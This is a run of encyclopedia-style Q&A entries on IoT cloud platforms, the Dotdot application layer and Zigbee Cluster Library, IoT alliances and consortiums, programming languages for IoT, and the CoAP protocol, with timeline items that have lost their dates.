In general , we are beginning to see a shift towards leveraging the computer and service capabilities of the cloud to manage IoT devices better .
This is also quite evident from a snapshot of Google Trends showing increasing interest in Cloud computing compared to just IoT. How is an IoT cloud platform different from traditional cloud infrastructure ?
The traditional cloud infrastructure focuses on a model of cloud computing where a shared pool of hardware and software resources are made available for on - demand access in such a way that they can be easily and rapidly provisioned and released with minimal effort .
The IoT Cloud Platform extends this capability to resources that are more user - centric , which increases the count and scale of data and devices .
The cloud platform services can not only process big data from a wider set of IoT devices , but also provide a smart way to provision and manage each of them in an efficient manner .
This also includes fine - grained control , configuration and management of IoT devices .
One of the IoT Cloud platform differentiators is the ability of the engine to massively scale to handle real - time event processing of large volumes of data generated by various devices and applications .
The providers of IoT Cloud Platforms typically work with multiple parties , such as hardware vendors ( both for cloud services and IoT devices ) , telecommunication providers , software service providers and system integrators to build the platform .
What exactly is meant by Application Enablement Platform ( AEP ) ?
The world of IoT is one of variety : many hardware platforms , many communication technologies , many data formats , many verticals , and so on .
AEP is a platform that caters to this variety by providing basic capabilities from which developers can build complete end - to - end IoT solutions .
For example , AEP might offer a location - tracking feature rather than a more restrictive fleet tracking feature .
The former is more generic and , therefore , can be used in a number of use cases .
AEP gives faster time to market without sacrificing on customization and product differentiation .
The disadvantage is that users of AEP must have the skill sets to develop the solution .
The solution might also suffer from vendor lock - in .
With AEP , app developers need to worry about scaling up .
The AEP will take care of communication , data storage , management , application building and enablement , user interface security , and analytics .
When selecting an AEP , developers should consider developer usability , including good documentation and modular architecture , flexible and scalable deployment , good operational capability , and a mature partnership strategy and ecosystem .
Examples of AEP include ThingWorx Foundation Core , Aeris ' AerCloud , and the deviceWISE IoT Platform .
Could you list some IoT cloud platforms out there in the industry today ?
A selection of cloud platforms for Industrial IoT. Source : Newark 2016 .
With the advent of IoT with billions of devices getting connected to the internet , which not only compute , storage and run applications , there is also a need to handle large amounts of data coming into the system via the various interfaces such as sensors and user inputs .
Here are some IoT cloud platforms : Amazon Web Services IoT IBM Watson IoT Platform , Microsoft Azure IoT Hub , Google Cloud IoT Oracle Integrated Cloud for IoT SAP Cloud Platform for the Internet of Things , Cisco Jasper Control Center PTC ThingWorx Industrial IoT Platform Salesforce IoT Xively Carriots What factors should I consider when comparing different IoT cloud platforms ?
Comparison across different platforms depends on both business and technical factors : Scalability , Reliability , Customization , Operations , Protocols , Hardware agnostic , Cloud agnostic , Support , Architecture and Technology Stack , Security and Cost .
For example , a comparison of AWS IoT ( serverless ) and open - source IoT deployed on AWS showed that the former reduces time to market but is expensive at scale .
The end - to - end requirements and cost - benefit analysis between commercial and open - source solutions need to be considered while choosing the right platform .
One way to compare is to look at the best fit for various sectors , viz .
Management of various Devices , System , Heterogeneity , Data , Deployment , Monitoring and fields of Analytics , Research and Visualization .
Each of these sectors has its own performance criteria , such as real time data capture capability , data visualization , cloud model type , data analytics , device configuration , API protocols , and usage cost .
Data analytics performance and outcome also depends on factors such as device address and device egress , intermediate connectivity network latencies and speeds and support for optimized protocol translations .
Visualization of data , filtering of large masses of data and configurability of the millions of devices using smart application tools is another differentiating factor .
What are some challenges of adopting IoT cloud platforms ?
Security and privacy are the main concerns delaying the adoption of IoT Cloud Platforms .
Cloud providers typically will not own the data and are only authorized to do the analytics and control of systems as permitted by the owner of the data .
Any breach of data access either during transit or from storage is a concern from a privacy and security perspective .
Also , since the value of IoT data is immense , proper legal agreements and mechanisms must be in place to ensure the data or outcome of data analysis is only used for the intended purpose by the authorised personnel .
Existing IoT cloud platforms may not always conform to standards , thereby causing interoperability issues .
They may also not support heterogeneous modules or communication technologies .
When there 's too much data , context awareness can help , including decisions about what needs to be done at the edge .
Vertical silos continue to exist and this prevents the horizontal flow of information .
Middleware can solve this problem .
Many systems continue to use IPv4 and this could be a problem as devices run out of unique IP addresses .
Could you compare IoT components from Amazon , Microsoft and Google ?
Comparing IoT components of three cloud providers .
Source : Devopedia 2018 .
Amazon Web Services ( AWS ) , Microsoft Azure and Google Cloud Platform ( GCP ) are generic cloud platforms that have IoT - specific components .
These can be compared across various metrics .
Azure offers both PaaS and SaaS options .
Its Azure IoT Edge helps with data analysis at the edge .
Azure 's SDKs are either for running on device or as a service on the cloud .
Azure has support for a number of messaging protocols .
All platforms provide device SDKs to enable devices to easily authenticate and connect to the cloud .
Amazon FreeRTOS enables sensor nodes to easily connect to the cloud , while Amazon Greengrass brings cloud capability to edge devices .
AWS offers Device Shadow , which is a persistent virtual equivalent of the actual device .
This is useful if the device goes offline or suffers from intermittent network connectivity .
The Rules Engine can route messages to a variety of AWS endpoints .
Google 's Cloud IoT Core supports gRPCs for efficient binary messaging .
It also has hardware partners for easy device integration .
As a U.S. defense project , the ARPANET was launched .
By the late 1980s , this evolved into a publicly accessible packet - switched network called the Internet .
While at CERN , Tim Berners - Lee created the World Wide Web ( WWW ) that uses the Internet as its backbone .
A year later , he implemented the first client and server communication over a network .
Kevin Ashton coins the term Internet - of - Things ( IoT ) while making a presentation to Procter & Gamble .
He notes that technologies such as sensors and RFIDs are better at tracking things in the real world than humans .
To enable others to benefit from the technologies at Amazon , Amazon launched Amazon Web Services ( AWS ) , one of the first commercial Cloud Services Platforms .
With the infrastructure of AWS , businesses can build and manage their websites in a lot easier way .
AWS was relaunched in 2006 with the release of Amazon Elastic Compute Cloud ( EC2 ) .
Launch of new IoT platform startups peak in 2013 .
Source : Williams 2017 .
IoT cloud platforms have been on the rise since the late 2010s .
The year 2013 sees a peak in new startups in this space .
A market study reveals that there are 450 + companies offering IoT platforms , up from 360 companies in 2015 .
Not all of these are cloud platforms .
A third of them cater to industrial IoT. Niche platforms focus on vertical use cases rather than horizontal cross - industry use cases .
Dotdot logo .
Source : Zigbee Alliance 2020 .
Dotdot is the universal language of the Internet of Things ( IoT ) , making it possible for devices to work together on any network .
Dotdot makes devices interoperable , regardless of vendor or connectivity technologies .
Consumers can buy any appliance and expect it to talk to other appliance , so long as both Dotdot certified .
Dotdot was developed by the Zigbee Alliance , an open , global , non - profit organization .
Dotdot itself was made possible by the Zigbee Cluster Library ( ZCL ) defined for the Zigbee stack .
Dotdot is more universal .
It sits at the application layer but lower layers can be Zigbee , Thread , Wi - Fi , Bluetooth , and more .
Zigbee devices can already interoperate among themselves seamlessly .
Dotdot extends this to non - Zigbee devices .
Other organizations or communities ( Bluetooth , OMG , OCF , GS1 , Haystack , Schema.org ) are also developing specifications for IoT interoperability at the application layer .
These could complement or compete against Dotdot .
What 's the need for Dotdot ?
Dotdot Overview .
Source : Zigbee Alliance 2017b .
IoT devices connect with various wired or wireless technologies and networking protocols .
That 's fine so long as devices can understand one another at the application layer .
Back in 2017 , a toaster could n't communicate with a coffee machine .
A smart hub probably could n't control an off - the - shelf smart lock or thermostat .
A light switch could n't turn off or dim a lamp .
This is because devices come from different vendors .
Their interfaces are either closed , limited or proprietary .
For example , devices from Apple , Google , Amazon or Samsung probably need different mobile apps to control them .
This is a difficult scenario for any systems integrator who has to understand and interface many different technologies .
Even at runtime , devices will sacrifice some processing to protocol translation .
What we need is a common language at the application layer that all devices can understand .
This is exactly what Dotdot provides .
It 's possible to build a cloud platform that understands all devices .
The cloud then becomes the convergence point for devices to talk to one another .
But for many applications , relying on the cloud is unacceptable due to reliability , complexity and latency .
What are the benefits of using Dotdot ?
Dotdot has the following benefits : Single solution for all markets - A single application layer that works over many networks means a single choice for developers and consumers .
This ends market fragmentation across segments : home , building , industrial , retail , health , energy , and more .
Easy - All necessary documents , references and tools are available in a single location and a single certification mark on every certified product and package .
Secure - Unique IDs , DTLS sessions , operational certificates and Access Control Lists ( ACLs ) .
Global - Built on the open standards and global membership of 400 Zigbee Alliance members .
It uses 2.4 GHz and 800 - 900 MHz bands that are globally available .
Proven - Based on the Zigbee Cluster Library ( ZCL ) that has been deployed in over 300 million products for over 10 years .
reliable and robust - Dotdot brings a rich catalog of device interaction models to IP networks .
This enables devices to interoperate natively , while being able to interact with similar / complimentary devices on a Zigbee network .
Interoperable - Certification ensures device - to - device interoperability .
It enables and connects multi - vendor ecosystems .
Where does Dotdot fit within the protocol stack ?
The Dotdot sits in the application layer .
Source : Adapted from Moneta and Williams 2017 .
Dotdot is meant for the application layer .
Zigbee Alliance also has a certification program to certify devices that are compliant with the Dotdot specification .
At the lower layers , Dotdot can interwork with any network or connectivity protocol .
This includes Zigbee , Thread , Wi - Fi , Bluetooth , and more .
With Dotdot , we can have direct device - to - device communications within a Zigbee network or within a Thread network .
When a Zigbee device needs to talk to a Thread device , there will be a gateway to translate between the two networks .
However , the devices can understand each other at the application layer , thanks to Dotdot .
With Dotdot over Thread , there 's no need for a gateway to connect the device to the cloud .
Since Thread is IP based , such devices can directly talk to the cloud .
How is Dotdot related to the Zigbee Cluster Library ( ZCL ) ?
Mapping Zigbee to Thread + Dotdot .
Source : Tekippe 2018 , slide 12 .
Zigbee Alliance standardized ZCL so that different devices can interoperate at the application layer .
ZCL contains 100 + device types , 2400 + certified products , and has matured over 15 years .
The only problem with ZCL is that it works only with the Zigbee stack .
This is where Dotdot fits in .
Dotdot can be seen as a universal application layer that can work with any underlying stack .
As an example , the Dotdot interfacing to Thread stack was shown at CES 2017 .
In this case , ZCL maps to CoAP Resources and HTTP verbs such as GET , PUT , POST , and DELETE .
Dotdot enables Zigbee devices to get connected to the Internet .
In fact , Dotdot is considered an alias for ZCL over IP ( ZCLIP ) .
It 's been said that Dotdot is a standard that allows you to put ZCL on any “ rails ” other than Zigbee – WiFi , Thread , and so on .
ZCL is optimized for constrained devices .
Messages are compact , most fitting within the 127-byte 802.15.4 packet .
Zigbee Alliance got a head start by reusing the work done on ZCL for IP networks .
Which are the documents relevant to Dotdot development ?
Dotdot resource table .
Source : Desbenoit and Vulcano 2017 , slide 20 .
For mapping ZCL to IP and RESTful interfaces , the following IETF documents are relevant : RFC 6690 : Constrained RESTful Environments ( CoRE ) Link Format , RFC 7252 : Constrained Application Protocol ( CoAP ) , RFC 7049 : Concise Binary Object Representation ( CBOR ) ZCL Specification is an essential reference .
It 's also worth reading NXP 's ZCL User Guide .
What exactly is the Dotdot Commissioning App ?
The Dotdot Commissioning App is an app that 's mostly based on the Thread Commissioning App developed for commissioning Thread - enabled devices .
This app facilitates management and expansion of the Dotdot network .
The app first discovers Dotdot - compliant devices in a Thread network .
It interrogates each device to discover services , clusters and endpoints .
It discovers commands supported by each device .
Once this is done , the app can send commands and change attributes on devices .
Zigbee Alliance members get access to this app .
This saves operators the trouble of developing their own apps .
What are the alternatives to Dotdot ?
An alternative to Dotdot exists at the application layer .
Source : Berrios et al .
2017 , fig .
12 .
IoTivity is a reference implementation of Open Connectivity Foundation ( OCF ) specifications .
It uses RESTful interfaces .
The IPSO Alliance is also involved in defining specifications .
Object Management Group ( OMG ) defined the Data Distribution Service ( DDS ) for its Industrial Internet Consortium ( IIC ) .
OMG has defined standards for healthcare and retail .
Bluetooth Special Interest Group ( SIG ) concerns itself with application layer interoperability among constrained devices .
It does this via Generic Attributes ( GATT ) profiles and assigned numbers .
GS1 is involved in supply chain standards for data exchange across Retail , Healthcare , and Transport & Logistics industries .
Its standards include EPC Information Service ( EPCIS ) , Core Business Vocabulary ( CBV ) , Global Product Classification ( GPC ) , and more .
IETF 's Extensible Provisioning Protocol ( EPP ) is an application - layer , client - server protocol for the provisioning and management of objects stored in a shared central repository .
Developed for Internet domains and hosts , it can be extended to IoT. Project Haystack is an open community looking at semantic data models and web services .
Schema.org manages a common set of semantic schemas .
Its current ontology can be extended to IoT. Zigbee Alliance publishes the first release of the Zigbee Cluster Library ( ZCL ) .
Revision 6 of this document appeared in January 2016 .
A cluster is a related collection of commands and attributes , which together define an interface to a specific functionality .
Example clusters include HVAC , lighting , security and safety , and measurement and sensing .
ZCL later became a starting point for Dotdot .
At a meeting in Boston , a stack vendor and two door lock manufacturers discuss how best to interface their products .
Over a few days , they agreed on what will eventually become the Door Lock Cluster within ZCL .
This cluster defines how doors can be locked / unlocked or their pin codes changed .
This is just one example of how clusters in ZCL are organized around specific device types .
Though the IoT world has seen a number of protocols at the connectivity layers in the last few years , this is the year when there 's serious talk about interoperability at the application layer .
Since various devices have to understand one another in terms of types , capabilities and interfaces , it 's also called semantic interoperability .
Many specifications and guidelines are available by the end of the year .
Dotdot can work with any networking stack .
Source : DSR Corporation 2019 .
At CES , Zigbee Alliance demonstrates how Dotdot can enable devices across Zigbee and IP networks to talk to each other .
In particular , they show Thread - based devices that have Dotdot at the application layer .
Thread Group releases version 1.1 of the Thread specification and a certification program .
The Zigbee Alliance and Thread Group announce the availability of the Dotdot over Thread Specification .
The specification is available to Zigbee Alliance members .
By mid-2018 , they expect to release the Dotdot Commissioning Application and launch a certification program .
The Dotdot over Thread certification program has launched .
Support for more networks other than Thread will be added later in the year .
IoT alliances and consortiums compared by size .
Source : Evans 2015 , slide 21 .
Alliances and consortiums are shaping the IoT landscape to reach a level of standardization , maturity and acceptance .
They allow a reach which no individual organization can achieve .
They give confidence to the market that there 's larger commitment to the goals of the alliance or consortium .
Alliances and consortiums also enable mass adoption of technology .
Organizations like IEEE leverage their brand and mass reach to promote generic frameworks which cut across competing technologies .
They also help to consolidate an otherwise fragmented marketspace .
This helps businesses reach economies of scale to make the price of solutions affordable to the common man or enable the industry to deploy systems on a large scale .
While many alliances / consortiums existed in 2014 , later years saw mergers and collaborations , leading to less market fragmentation .
What 's the role of IoT alliances and consortiums ?
The ecosystem of the NFC Forum .
Source : NFC Forum 2020 .
Alliances and consortiums provide the following : Help to promote standards and product certifications in a particular area ( Examples : RFID Consortium , NFC Forum , Wi - Fi Alliance , Zigbee Alliance , LoRa Alliance ) Facilitate joint R&D efforts , influence direction of the industry , promote best practices , and provide testbeds ( Example : IIC ) Help new entrants or startups to start quickly by providing required licenses , ecosystem or access to standards so that they can concentrate on building their differentiators Standards organizations can sometimes be guilty of catering only to those vendors who are on their committees .
Alliances and consortiums , being non - profit , help drive requirements for standardization , and subsequent testing and certification in a vendor neutral manner .
But when they also create the standards and fail to make them public , the entire industry suffers .
What should we look for when joining a particular IoT alliance or consortium ?
Results of a 2018 survey of important IoT consortiums .
Source : Cabé 2018 , slide 44 .
We can evaluate based on the following : Openness : What are their policies on intellectual property ?
Are there royalties involved in implementing their standards ?
Is it a closed group that requires paid membership ?
Availability : Is their work ( standards , white papers , guidelines ) already available or is it still a work in progress ?
Adoption : Are people in industry already adopting and using their work ?
Back in 2014 , Ian Skerrett evaluated a number of IoT alliances and consortiums based on the above metrics and published a descriptive analysis , which is a good read .
In 2018 , an online survey of 502 participants showed that Eclipse IoT , Apache Foundation , W3C , and IEEE are among the top consortiums that developers considered important in the IoT space .
However , we should note that this survey was conducted by Eclipse IoT , AGILE IoT , IEEE and OMA .
The survey targeted only members of their communities .
What are the major IoT alliances and consortiums ?
Internet of Things Alliances and Consortiums from 2015 .
Source : Postscapes 2018 , figure , v1.0 , March 2015 .
Among the many IoT alliances and consortiums , some important ones are the following : Industrial Internet Consortium ( IIC ) , IEEE Open Connectivity Foundation ( OCF ) Thread Group LoRa Alliance . In one study from early 2018 , the following important alliances were listed : OMA , Genivi , IIC , IoT Consortium , TrustedIoTAlliance , OneM2 M , AIOTI , and OCF .
Some alliances and consortiums are vertically focused on a particular industry .
For example , Thread Group is focused on connected homes ; Apple 's HealthKit is about health and fitness ; EnOcean Alliance is about building automation ; Open Automotive Alliance is about connected cars ; HART Communication Foundation looks at the industrial IoT space .
How does the Industrial Internet Consortium ( IIC ) contribute to IoT ?
IIC 's publications span horizontal and vertical concerns .
Source : IIC 2019 , fig .
1 - 1 .
The IIC was founded by AT&T , Cisco , General Electric , IBM , and Intel in March 2014 .
Though its parent company is the Object Management Group , IIC itself is not a standardization body .
It had around 155 members as of August 2020 .
It was formed to bring together industry players — from multinational corporations , small and large technology innovators to academia and governments — to accelerate the development , adoption and widespread use of Industrial Internet technologies .
IIC members work to create an ecosystem for insight and thought leadership , interoperability and security via reference architectures , security frameworks and open standards , and real world implementations to vet technologies and drive innovations ( called testbeds ) .
As per Compass Intelligence , IIC won the top IoT organization influencer of the year award for 2018 .
What role does IEEE play in IoT ?
The IEEE IoT Initiative was launched in 2014 .
It aims to help engineering and technology professionals learn , share knowledge and collaborate around IoT. IEEE has a variety of programs that can help solution providers that are trying to understand IoT , including the IEEE IoT Technical Community , which is made up of members involved in research , application and implementation of IoT. IEEE also heads the IoT Scenarios Program , which is an interactive platform to demonstrate use cases , business models and service descriptions .
In March 2020 , IEEE published an architectural framework for IoT , IEEE 2413 - 2019 .
IEEE also publishes a number of peer - reviewed IoT papers across its different publications , including the IEEE Internet of Things Journal ( IoT - J ) that 's dedicated to IoT. IEEE also organizes many conferences and events on IoT around the world , in particular the IEEE World Forum on Internet of Things ( WF - IoT ) .
What are the major developments in the Open Connectivity Foundation ( OCF ) ?
Open Interconnect Consortium ( OIC ) in 2016 changed its name to Open Connectivity Foundation ( OCF ) when Microsoft and Qualcomm joined this group .
The AllSeen Alliance was developing the AllJoyn standard , which was first created by Qualcomm .
In October 2016 , the AllSeen Alliance and OCF merged together to become the new OCF .
The merged group continues working on the open - source IoTivity ( OCF ) and AllJoyn ( AllSeen ) projects under the auspices of the Linux Foundation , eventually merging them into a single IoTivity standard .
Developing interoperability standards is one of the key aims of the OCF , a single IoTivity implementation that offers the best of the previous two standards .
Current devices running on either AllJoyn or IoTivity are expected to be interoperable and backward - compatible with the unified IoTivity standard .
There are millions of AllJoyn - enabled products on the market .
What 's the role of Thread Group among IoT alliances ?
Thread is a mesh network built on open standards and IPv6/6LoWPAN protocols to simply and securely connect products around the house .
6LoWPAN is a power - efficient personal area network protocol with underlying standards of IPv6 and IEEE 802.15.4 .
Thread is also capable of running for a long period of time from a long - lasting battery .
Members of the Thread Group include ARM , Nordic , NXP , Nest , Qualcomm , Tridonic , Texas Instruments , Silicon Labs , and many more .
Thread Group members get practical resources to help grow the world of connected devices by joining a global ecosystem of technology innovators .
The group also offers a certification program based on Thread 1.1 specification .
Thread can run multiple applications layers including Dotdot , LWM2 M , OCF or Weave .
Thread Group liaises with other IoT alliances and consortiums like Open Connectivity Foundation and Zigbee Alliance and tries to provide a one - stop shop for the home IoT. What is special about the Lora Alliance group ?
The LoRa Alliance is a fast growing technology alliance .
It 's a non - profit association of more than 500 member companies , committed to enabling large scale deployment of Low Power Wide Area Networks ( LPWAN ) IoT through the development and promotion of the LoRaWAN open standard .
Members benefit from a vibrant ecosystem of active contributors offering solutions , products & services , which create new and sustainable business opportunities .
Through standardisation and the accredited certification scheme , the LoRa Alliance delivers the interoperability needed for LPWA networks to scale , making LoRaWAN the premier solution for global LPWAN deployments .
The speciality of Lora Alliance is that it operates primarily on the WAN side of the IoT space .
What are the other alliances and consortiums to keep a watch on ?
In 2015 , some companies got together to address security aspects of IoT. They defined the Open Trust Protocol ( OTrP ) .
It 's overseen by the OTrP Alliance while collaborating with IETF and Global Platform .
The key insight is that system - level root of trust is necessary .
Security must be addressed at all levels , from firmware to applications .
Trusted IoT Alliance applied blockchain technology to IoT. In January 2020 , this alliance merged into IIC .
Founded in 2008 , IPSO Alliance promoted the Internet Protocol for " smart object " communications , advocating for IP networked devices in health care , industrial and energy applications .
In 2018 , it merged with Open Mobile Alliance ( OMA ) to form OMA SpecWorks .
An AllSeen Alliance was formed .
Premier level members include Haier , LG Electronics , Panasonic , Qualcomm , Sharp , Silicon Image and TP - LINK .
Some IoT alliances and consortiums of 2013 - 14 .
Source : Jeppesen 2016 .
This is the year when alliances and consortiums start appearing .
The Thread Group , Open Interconnect Consortium ( OIC ) and Industrial Internet Consortium ( IIC ) all started in 2014 .
The IEEE IoT Initiative has also been launched .
Thread Group opens for membership in October .
Open , non - profit LoRa Alliance becomes operational .
Its mission is to promote global adoption of the LoRaWAN standard .
By 2018 , it will have 500 + members .
To accelerate distributed computing , networking and storage for IoT , ARM , Cisco , Dell , Intel , Microsoft and Princeton University Edge Laboratory established OpenFog Consortium .
The focus is to build frameworks and architectures for end - to - end scenarios with capabilities pushed to network edges .
In February , Open Interconnect Consortium ( OIC ) was renamed into Open Connectivity Foundation ( OCF ) .
In October , AllSeen Alliance merged into OCF .
OCF will now sponsor both IoTivity and AllJoyn open source projects at The Linux Foundation .
Industrial Internet Consortium ( IIC ) and EdgeX Foundry merge with a mandate " to align efforts to maximize interoperability , portability , security and privacy for the industrial Internet " .
EdgeX Foundry , a Linux - backed , open - source project , has been " building a common interoperability framework to facilitate an ecosystem for IoT edge computing " .
Apple , Google , Amazon and Zigbee come together to form a new working group under the Zigbee Alliance called Connected Home over IP ( CHIP ) .
It 's based on IPv6 and is meant to work with any PHY or MAC layer for any application or product .
However , CHIP leaves out OCF from the discussions , which might create interoperability issues .
A selection of programming languages for IoT. Source : Devopedia 2018 .
Programming for IoT is usually a polyglot ( multiple languages ) effort since the Internet - of - Things ( IoT ) is a system of inter - related computing devices that are provided with unique identifiers and the ability to transfer data over a network .
The choice of programming - language depends on the capability and purpose of the device .
IoT encompasses a variety of devices , including edge devices , gateways , and cloud servers .
What are the popular languages for IOT ?
Popular languages for IoT by device types .
Source : Skerrett 2017 , slide 7 .
The most popular languages in IoT are Java , C , C++ , Python , Javascript , Node.js , Assembler , PHP , C # , Lua , R , Go , Ruby , Swift and Rust in descending order of popularity .
This is from a 2017 online survey co - sponsored by Eclipse IoT Working Group , IEEE IoT , AGILE IoT and IoT Council in which 713 individuals participated .
Other languages include Parasail , Microsoft P , Eclipse Mita , Kotlin , Dart , MicroPython , and B # .
Which languages are suitable for edge devices , gateways and cloud computing ?
Popular languages for Edge , Gateway and Cloud .
Source : Skerrett 2017 , slide 19 - 21 .
Edge Devices - These are constrained - resource embedded systems .
For very small devices ( higher constraints ) , Assembly and C are the languages of choice .
A better processor and more computing power on the device enables one to use C , Python , Node.js , Java .
The focus is to minimize instruction count , and maximize execution speed and resource management .
Gateways - Gateways manage communication and do analysis of data from many devices through several different buses .
More languages can be run on these devices because of their increased computing power , including C , C++ , Java , Python , and Node.js .
Cloud - With the nearly unlimited computing capability that 's available , frameworks like Apache Hadoop and HiveQL can compute and process large IOT datasets .
Statistical computing and visualization can be done using languages like R or Julia .
What are the approaches used in IoT application development ?
Node - Centric Programming - Every aspect is programmed by the developer , like communication between nodes , collection and analysis of sensor data , issuing commands to actuator nodes .
Interaction between devices is explicitly encoded .
Database approach - Every node is considered part of a database and the developer can issue queries to sensor nodes .
The focus is on collection , aggregation and sending of data to the base station .
Macro programming - Abstractions are provided to specify high - level communication .
Model - driven development - Application development complexity is reduced by increasing the level of abstraction and by describing the system using different system views .
The vertical separation of concerns ( SOC ) reduces app development complexity by separating platform - independent model ( PIM ) and platform - specific model ( PSM ) .
The horizontal separation of concerns separates different aspects of a system .
What are the features to consider when evaluating IoT programming frameworks ?
The following features are relevant : Scalability - Programming frameworks that support diverse programming patterns that are able to perform load - balancing dynamically .
Concurrency - Real - time communication between millions of devices and applications means millions of concurrent connections .
Thread locking is not efficient in such situations .
Coordination - Programming language support for explicitly ( control driven ) or implicitly ( data driven ) orchestrating the role of computing elements .
The Heterogeneity - Programming framework gives guidance on how computations are mapped into the computing elements .
Fault tolerance - Applications should be able to gracefully go from online to offline state as networks partition and heal their connections .
Light footprint - In terms of runtime overhead and in terms of programming effort , the framework should be light .
Support for latency and sensitivity - In geographically distributed applications , pushing all computations to the cloud is not ideal .
The programming framework has to handle these requirements dynamically .
What programming paradigms are suitable for IoT ?
A programming paradigm is a way to classify the programming language based on its execution model .
It should be kept in mind that a particular language can have more than one paradigm .
The following programming paradigms are suited for IoT : Functional - Functional programming helps solve the challenges of scalability and concurrency .
Its preference for immutability , function composition , avoiding side - effects , less code , etc .
avoid several IoT pitfalls .
Dataflow - Dataflow programming emphasizes the movement of data .
It models programs as a series of connections .
Explicitly defined inputs and outputs connect operations .
An operation runs as soon as all of its inputs become valid .
Dataflow languages are inherently parallel and can work well in large decentralized systems .
Event - Driven - Event - driven programming ( events triggered by sensors , connectivity , or time ) is well suited to IoT where devices spend most of their time in power - saving modes , wake up due to some event , process data , send it out , and go back to sleep .
Are there any specific requirements that the languages should satisfy to be used for IoT ?
Software Tool Chain : From Host to Microprocessor .
Source : Harris 2017 .
Developers can consider the following : Languages that support Functional , Dataflow , or Event - driven programming .
Interpreted languages ( Python ) are slower than compiled ones ( C / C++/Rust / Go ) .
Type safety , memory management , no null pointer exceptions .
Languages such as C and C++ use explicit pointers to reference memory .
Incorrect pointer calculations can lead to buffer overruns and memory access violations .
Availability of GPIO libraries .
Libraries that support IoT protocols like Advanced Message Queuing Protocol ( AMQP ) , Constrained Application Protocol ( CoAP ) , Extensible Messaging and Presence Protocol ( XMPP ) , OASIS MQTT , or Very Simple Control Protocol ( VSCP ) .
Within languages , are there any specific variants , modules or libraries that enable IOT ?
In Python , " mraa " and " paho - mqtt " are useful for IoT. .
MicroPython can be used on constrained devices .
Java first appeared in the 1990s for a resource - tight embedded environment , requiring minimum computing power .
Many of the Oracle Java ME Embedded APIs are targeted at the needs of embedded systems .
Eclipse Mita is a new programming language designed to feel like modern programming languages in the vein of TypeScript , Kotlin , and Go .
It helps scale from prototypes to commercial IoT deployments by transpiling to C code .
Could you share some best practices for IoT developers ?
Choose a programming framework that promotes design reuse , implementation reuse and validation reuse in order to enhance software extensibility , flexibility and portability .
To make distributed IoT microservices resilient , developers should be able to specify the precise sequence of execution steps to be taken by compiled code , regardless of the order in which asynchronous event messages are processed .
Could you list IDEs , debuggers and tools for IoT programming ?
IDEs and Tools for IoT. Source : Devopedia 2018 .
IDEs and tools for IoT are many and we list some of them below : Eclipse IOT project ( Kura ) - This is a Java - based development framework for IoT applications .
Arduino IDE - This IDE includes support for the C and C++ programming languages for programmable microcontrollers .
It 's a complete package with many examples and pre - loaded libraries .
Raspbian - This IDE comes with many packages and examples created specifically for the Raspberry Pi boards .
OpenSCADA - This project is a part of the Eclipse IOT Industry Working Group along with Eclipse SCADA ( Supervisory Control and Data Acquisition ) .
It provides several libraries , interface apps , and configuration tools .
PlatformIO - This is a cross - platform IDE that supports over 400 embedded boards , and several development platforms and frameworks .
Macchina.io - This is a toolkit for building embedded applications for IoT using POCO C++ libraries and the V8 JavaScript engine .
The core is implemented in C++ .
JavaScript is used for application development .
It enables dynamically extensible modular applications using the plug - in and services model similar to OSGi in Java .
International Telecommunications Union publishes the 7th in its series of reports on the Internet , titled “ The Internet of Things .
” IBM releases version 0.2.0 of Node Red , a visual wiring tool for IoT. In 2016 , IBM contributed Node - RED as an open source JS Foundation project .
Damien George launches MicroPython , a software implementation of the Python 3 programming language , written in C , that 's optimized to run on a microcontroller .
Lars Bak and Kasper Lund of Google announce the Fletch project for the Dart programming language to optimise it for Internet of Things ( IoT ) devices .
Microsoft open sources P , a language designed for asynchronous event - driven programming , which it considers vital for the cloud , artificial intelligence and IoT. Team KinomaJS starts Moddable , a new company building tools for developers to create open IoT products using standard JavaScript at low cost microcontrollers .
KinomaJS is a JS application framework optimised for IoT. KinomaJS was previously supported by Marvell Semiconductor .
Google makes Kotlin ( JetBrains ) , a statically typed programming language for JVM , a first class language for Android Apps and its Android Things IoT Platform .
Eclipse announces Mita , a language that aims to remove the entry barrier to embedded IoT development .
Mita is transpiled to the C code .
It combines imperative programming with model - driven configuration .
The Linux Foundation announces ACRN , an open source reference hypervisor project designed for IoT device development .
HTTP is a widely used web protocol but it 's not suited for the Internet - of - Things ( IoT ) .
IoT is composed of constrained nodes running on 8-bit microcontrollers with small amounts of ROM and RAM .
IoT networks have low bandwidth and low availability .
IPv6 over Low - Power Wireless Personal Area Networks ( 6LoWPANs ) , used in IoT , often has high packet error rates and a typical throughput of tens of kilobits per second .
Given these constraints , IETF 's CoRE ( Constrained RESTful Environments ) Working Group defined Constrained Application Protocol ( CoAP ) .
Whereas HTTP packets might take up thousands of bytes , CoAP packets are only tens of bytes .
CoAP handshaking is also lighter since it uses UDP instead of TCP .
CoAP focuses on being lightweight and cost effective .
It supports networks with billions of nodes .
CoAP uses the REST ( Representational State Transfer ) architectural style .
What are the main features of CoAP ?
Like HTTP , CoAP involves a client requesting a URI from a server .
Source : Chakrabarti 2016 , slide 9 .
Since IoT uses the internet , CoAP has been designed very much in the spirit of HTTP that powers the internet .
Like HTTP , CoAP is a document transfer protocol .
A client requests a resource at a URI ( Uniform Resource Identifier ) and the server responds .
Moreover , RESTful principles are followed ; verbs GET , POST , PUT , DELETE are used .
The protocol is indicated with ` coap:// ` .
Where CoAP differs from HTTP is that UDP is used for transport instead of TCP .
UDP handshaking is lighter and easier to implement on microcontrollers .
The CoAP header is only 4 bytes .
CoAP can also use UDP 's broadcast and multicast features .
CoAP communication is using connectionless datagrams .
Because datagrams are used , SMS and other packet - based protocols may be used .
CoAP uses a subset of MIME types and HTTP response codes .
There 's also a built - in discovery mechanism .
For security , Datagram TLS ( DTLS ) is used .
Since there 's no TCP , CoAP takes care of message acknowledgement , retries with congestion control and duplicate detection .
To keep things simple , these features are optional .
Could you describe the architecture of CoAP ?
Web architecture with HTTP and CoAP .
( a ) HTTP and CoAP work together across constrained and traditional Internet environments ; ( b ) CoAP protocol stack and HTTP protocol stack .
Source : Bormann et al .
2012 .
The CoAP protocol is closely aligned to the traditional web stack based on HTTP .
UDP is used instead of TCP at the transport layer .
CoAP uses binary encoding unlike the textual encoding of HTTP , but otherwise , both are based on RESTful APIs and request - response method .
This one - to - one mapping between the two stacks makes it possible to interwork the two protocols via a proxy .
Within the constrained network , CoAP is used , but elsewhere , CoAP messages can be translated into HTTP .
Such proxies may reside at the edge of a cloud .
It 's also possible to bypass such a proxy and deploy CoAP end to end if cloud platforms support this .
We can also think of CoAP as being composed of two logical sub - layers : a lower messaging layer to deal with UDP and asynchronous interactions ; an upper request / response layer that deals with the semantics using message codes and response codes .
